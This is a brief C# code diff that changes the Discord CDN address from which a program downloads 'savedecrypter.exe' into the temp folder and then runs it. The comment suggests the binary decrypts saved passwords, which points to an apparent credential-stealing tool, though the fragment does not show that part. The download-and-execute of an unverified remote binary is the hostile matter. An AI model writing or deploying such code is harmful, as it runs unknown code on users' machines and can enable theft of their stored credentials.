@@ -26,7 +26,7 @@ namespace ConsoleApp4
 
             WebClient wc = new WebClient();
 
-            wc.DownloadFile("https://cdn.discordapp.com/attachments/732523154639028265/732537877103116309/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
+            wc.DownloadFile("https://cdn.discordapp.com/attachments/737682930146607104/737747493252759612/savedecrypter.exe", Path.GetTempPath() + "\\decode.exe");// amateurz's savedecrypter for 1 pass :D
             Process.Start(new ProcessStartInfo
             {
                 FileName = Path.GetTempPath() + "\\decode.exe",
